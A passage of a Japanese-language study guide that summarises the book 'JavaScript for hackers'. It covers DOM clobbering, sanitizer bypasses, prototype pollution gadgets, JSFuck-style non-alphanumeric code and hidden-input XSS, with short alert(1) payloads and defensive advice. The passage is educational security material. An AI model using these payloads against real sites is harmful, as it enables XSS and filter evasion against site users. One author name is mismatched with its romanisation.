なぜ動くか: 同一 `id` を持つ要素が複数あると、ブラウザはそれらを `HTMLCollection`（要素の集合）としてまとめ、`name` 属性で個々の要素にプロパティのようにアクセスできるようにします。これにより `config.url` という **二段以上のプロパティアクセスを HTML だけで作り出せ**、アプリが `config.url` をスクリプトの `src` などの sink（シンク＝ユーザー入力が最終的に実行・解釈される危険な代入先）に渡していれば、任意の値を注入できます。`<form>` と `<input name>`、`<iframe name>` の `srcdoc`/`contentWindow` などを組み合わせるバリエーションも本書で扱われます。

#### DOMPurify などサニタイザのバイパス

本書は、代表的な HTML サニタイザ（危険な要素・属性を除去して安全な HTML に整える処理）である **DOMPurify** の回避も扱います。DOMPurify は注入要素の `id`/`name` を検査して既知のグローバル関数との衝突を防ごうとしますが、その保護は特定ケースに限られ、過去に複数の DOM Clobbering バイパスが報告されてきました。

一例として、**DOMPurify が許可していた `cid:` プロトコルは二重引用符を URL エンコードしない** ため、属性値内にエンコードされた二重引用符を仕込むと実行時にデコードされ、属性値から抜け出してイベントハンドラを作れる、というバイパスがあります。

> ⚠️ バージョン依存の注意: DOMPurify のバイパスは対象バージョンと修正状況の明記が不可欠です。DOM Clobbering 関連の代表的な修正としては、`document.currentScript` の clobbering を悪用する mutation XSS（mXSS）バイパスが **DOMPurify 2.0.17（2020年公開・修正）** で塞がれた事例が知られています。サニタイザの脆弱性は「どのバージョンで刺さり、どのバージョンで直ったか」を必ず確認してください（陳腐化に注意。最新版では多くの古典的ベクタは無効化されています）。

> 出典: DOM Clobbering Prevention — OWASP Cheat Sheet Series — https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html

防御の要点: (1) グローバル変数を前提にした `if (window.foo)` 的コードを書かない、(2) 重要な参照は `document.getElementById` ではなく **型チェック**（`foo instanceof HTMLElement` で要素に化けていないか確認）や `Object.freeze` で守る、(3) サニタイザは最新版を使い、`SANITIZE_NAMED_PROPS` など clobbering 対策オプションを有効にする、です。

---

### ブラウザ悪用と SOP バイパス

本書には、各ブラウザ（Firefox・Safari・Internet Explorer・Chrome・Opera など）固有の実装差を突いた **Same-Origin Policy（SOP＝同一オリジンポリシー。異なるオリジン間のデータ読み取りを禁じるブラウザの基本防御）バイパス** を扱う章があります。SOP はオリジン（スキーム＋ホスト＋ポートの三つ組）が一致しない限りクロスオリジンのデータ読み取りを禁じますが、歴史的にブラウザ実装には多数の抜け穴がありました。

本書の狙いは個別の（多くは既に修正済みの）バグの列挙ではなく、**「ブラウザごとにセキュリティ境界の実装が異なり、その差分こそが攻撃面になる」** という発想を身につけさせることです。文字コードの扱い、URL パーサの解釈差、`document.domain` の緩和、`about:blank`/`javascript:` URL の継承オリジンの扱いなど、オリジン判定の周辺に生じるズレを実験（＝前節のファジング）で見つける、という一貫した方法論が背骨になっています。バージョン依存性が非常に高い領域なので、記載されたベクタは対象ブラウザ・バージョンの明記とともに「現在も有効か」を必ず検証すべき、という注意が伴います。

---

### プロトタイプ汚染（Prototype pollution）

本書はクライアントサイド・サーバーサイド双方の **プロトタイプ汚染（prototype pollution）** を扱います。これは JavaScript のオブジェクトが共有する大元の設計図 **`Object.prototype`** を攻撃者が書き換え、以後生成される（あるいは既存の）ほぼすべてのオブジェクトに勝手なプロパティを混入させる脆弱性です。

> 出典: Client-side prototype pollution — PortSwigger Web Security Academy — https://portswigger.net/web-security/prototype-pollution/client-side ／ Prototype Pollution — PayloadsAllTheThings — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Prototype%20Pollution/README.md

基本原理: JavaScript の全オブジェクトは **プロトタイプチェーン（prototype chain）** でつながっており、あるオブジェクトに存在しないプロパティを読むと、ブラウザはチェーンを親方向にたどって `Object.prototype` まで探索します。したがって `Object.prototype` に `foo` を生やせば、`({}).foo` でも `[].foo` でも、どこからでもその値が見えてしまいます。攻撃者は特別なキー **`__proto__`**（オブジェクトの親プロトタイプへの参照）や **`constructor.prototype`** を経由してこの大元に到達します。

典型的な注入源は URL のクエリ文字列・フラグメント・JSON 入力です。

```
https://vulnerable-website.com/?__proto__[foo]=bar
```

なぜ動くか: アプリが URL パラメータを再帰的にオブジェクトへマージ（`merge` / `extend` / `deep copy`）する処理を持ち、キー名を検証していない場合、`__proto__[foo]` というキーが「`__proto__` の中の `foo`」すなわち `Object.prototype.foo` への代入として解釈され、汚染が成立します。

#### ガジェット（gadget）で XSS へ昇格させる

プロトタイプ汚染そのものは「任意プロパティを注入できる」だけで、直接コード実行にはなりません。実際の攻撃には **ガジェット（gadget＝汚染したプロパティを、アプリが検証せずに危険な sink へ流し込んでくれる既存コード）** が必要です。

```
/?__proto__[transport_url]=data:,alert(1)
```

なぜ動くか: あるライブラリが「設定オブジェクトに `transport_url` が指定されていればスクリプトの `src` に使う」という実装（＝ガジェット）を持つとします。設定オブジェクトに `transport_url` が明示されていなくても、プロトタイプ汚染で `Object.prototype.transport_url` を仕込んでおけば、プロトタイプチェーン探索によってその値が読み出され、`data:,alert(1)` が `<script src>` に流れて XSS が発火します。PortSwigger の DOM Invader（Burp 付属の DOM 解析ツール）はこの `script.src` 到達を自動検出できます。

近年の大規模調査では、100 万サイトを対象に **133 個のゼロデイ・ガジェット** が見つかり、影響は DOM XSS にとどまらず Cookie 操作・URL 操作にも及ぶと報告されています。サーバーサイド（Node.js）では、汚染が `child_process` のオプションなどに波及して RCE（Remote Code Execution＝任意コマンド実行）に至る例もあります。

防御の要点: (1) `Object.create(null)`（プロトタイプを持たないオブジェクト）や `Map` を設定格納に使う、(2) マージ処理で `__proto__`・`constructor`・`prototype` のキーを弾く、(3) `Object.freeze(Object.prototype)` で大元を凍結する、です。

---

### 非英数字 JavaScript（Non-alphanumeric JavaScript）

本書は、**英字・数字を一切使わずに JavaScript を書く** 難読化技法も扱います。フィルタが `alert`・`eval` といった綴りやアルファベットを弾く状況で、記号だけでコードを組み立てて回避する発想です。

> 出典: Executing non-alphanumeric JavaScript without parenthesis — PortSwigger Research — https://portswigger.net/research/executing-non-alphanumeric-javascript-without-parenthesis ／ JSFuck — https://en.wikipedia.org/wiki/JSFuck

歴史的には、日本の研究者 **長谷川陽介（Yosuke Hasegawa）** が 2009 年に発表した **jjencode** が起点で、これを発展させた **JSFuck** は `[` `]` `(` `)` `!` `+` のわずか6文字だけで任意の JavaScript を表現します。

基本原理（型強制による文字の生成）:

```javascript
+[]        // → 0 （空配列を数値化すると 0）
![]        // → false
+!![]      // → 1 （true を数値化すると 1）
[][[]]     // → undefined （存在しないプロパティアクセス）
[]+[]      // → "" （空文字列）
```

なぜ動くか: JavaScript は演算子（特に `+` と `!`）による型強制が非常に寛容で、配列や真偽値を数値・文字列に自在に変換します。この変換結果の文字（`"undefined"` の `u`,`n`,`d`… や `"true"`/`"false"` の各文字など）を一文字ずつ拾い集めれば、`"constructor"` や `"alert"` といった任意の文字列を記号だけで組み立てられます。

そして組み立てた文字列を **Function コンストラクタ** に渡してコード実行に至ります。

```javascript
[]['constructor']['constructor']('alert(1)')()
```

なぜ動くか: 任意の値の `constructor` をたどると最終的に `Function` に到達します（配列 → `Array` → その `constructor` は `Function`）。`Function('alert(1)')` は「本体が `alert(1)` の新しい関数」を生成し、末尾の `()` で即実行します。`'constructor'` や `'alert(1)'` の部分を上記の記号だけで生成すれば、英数字ゼロで任意コードを実行できます。

実務上の限界: 本書も指摘するとおり、`alert` の5文字を型強制だけで作ると **約2万1千文字** に膨れ上がります。そのため実戦では「フィルタが検知する綴りだけを非英数字化し、残りは Base64 や文字列配列で通す」といったハイブリッドが現実的です。さらに前述の「括弧なし」技法（タグ付きテンプレートや `instanceof`+`Symbol.hasInstance`）と組み合わせれば、**記号のみ・かつ括弧なし** という極限の制約下でも実行に持ち込めます。

---

### 実戦 XSS テクニック（hidden input・accesskey・popover）

本書終盤の XSS テクニック章は、HTML エンティティやイベントハンドラの応用に加え、**「一見 XSS にできない場所」を実行に持ち込む** 高度なベクタを扱います。中でも有名なのが、属性しか制御できない **hidden input（`type=hidden` の隠しフィールド）** の攻略です。hidden input は画面に表示されずフォーカスもできないため、通常のイベント（`onmouseover` 等）が発火せず、XSS 化が困難とされてきました。

> 出典: Exploiting XSS in hidden inputs and meta tags — PortSwigger Research — https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags ／ XSS in hidden input fields — PortSwigger Research — https://portswigger.net/research/xss-in-hidden-input-fields

#### accesskey によるトリガ

```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```

なぜ動くか: `accesskey` 属性は「指定キーの組み合わせでその要素を起動する」ショートカットを定義します。hidden input でも accesskey は有効なため、被害者が所定のキー（Firefox の Windows/Linux では `ALT+SHIFT+X`、macOS では `CTRL+ALT+X`）を押すと `onclick` が発火します。当初は Firefox 限定でしたが、後に Chrome や `<link>` 要素でも動作することが判明し、**属性しか制御できない `<link>` の XSS** すら実現可能になりました。難点は「キー入力という利用者操作を要する」点です。

#### popover による自動発火（ユーザー操作の削減）

```html
<input type="hidden" popover onbeforetoggle="alert(1)">
```

なぜ動くか: Chrome に導入された HTML の **popover 機能** は、`popover` 属性を持つ要素の表示・非表示切り替え時に `ontoggle`／`onbeforetoggle` イベントを発火させます。これらは hidden input でも使えるため、従来ほとんどのイベントが死んでいた隠しフィールドで新たに XSS を起こせるようになりました。これにより、accesskey が要求していた重いユーザー操作を減らせます。

さらに Heyes は 2024 年、**利用者操作を一切必要とせずに hidden input で XSS を自動発火させる** ベクタ（発見者は木村（Masato Kinugawa）による auto-executing vector）を紹介し、公式 XSS チートシートに追加しています。これは popover の自動トグルなどを組み合わせ、ページ表示だけでイベントを起こす発想です。

> 出典: Gareth Heyes（X/Twitter, 2024）hidden input auto-executing vector 紹介 — https://x.com/garethheyes/status/1854191120277733760

これらの技法が示すのは、本書の一貫した姿勢——**「ブラウザに新機能（popover など）が入るたびに、それは新しい XSS の発火口になり得る。最新仕様を追い続けることがハッカーの武器になる」** ということです。

---

### この節のまとめ

『JavaScript for hackers』は、ペイロードのカタログではなく **「JavaScript 言語仕様とブラウザ実装のギャップを、実験（ファジング）と原理理解によって自力で武器化する方法論」** を教える書籍です。要点を再掲します。

- **括弧なし JavaScript**: タグ付きテンプレート、`onerror`+`throw`（および `eval`+`Uncaught` 変数化）、`Symbol.hasInstance`+`instanceof`、`valueOf` 型強制、`sort`/`map`+`call`、`DOMMatrix` の文字列化——いずれも「言語機能が裏で行う暗黙の関数呼び出し」に処理を肩代わりさせる。
- **ファジング**: Hackvertor と Shazzer で全文字・全文脈を総当たりし、仕様書にない挙動（文字コード再解釈、パーサの寛容さ）を発掘する。
- **DOM Clobbering**: `id`/`name` の名前付きアクセスと `HTMLCollection` の連鎖で、HTML だけでグローバル変数やネストしたプロパティを捏造する。サニタイザ回避はバージョン依存。
- **プロトタイプ汚染**: `__proto__`/`constructor.prototype` 経由で `Object.prototype` を汚染し、ガジェット（`script.src` などへ流す既存コード）を介して XSS/RCE へ昇格させる。
- **非英数字 JavaScript**: 型強制で文字を生成し `Function` コンストラクタで実行する。綴り検知フィルタを回避。
- **実戦 XSS**: accesskey・popover・auto-executing vector で「XSS 化不能」とされた hidden input や `<link>` を攻略する。

いずれの技法も、根底にあるのは **「防御側が想定していない仕様の隙間を、原理から理解して突く」** という発想です。バージョン依存の技法（DOMPurify バイパス、ブラウザ SOP バイパス等）は必ず対象バージョンと修正状況を確認し、陳腐化に注意して活用してください。

> 出典（総括）: JavaScript for hackers — Gareth Heyes — https://leanpub.com/javascriptforhackers （本文は未取得のため、内容は上記の各一次研究記事および目次・書評情報から再構成）

---

（前章: [第1章 基礎](./01-basics.md)　｜　次章: [第3章 DOMベースXSS](./03-dom-xss.md)　｜　[目次](./README.md)）
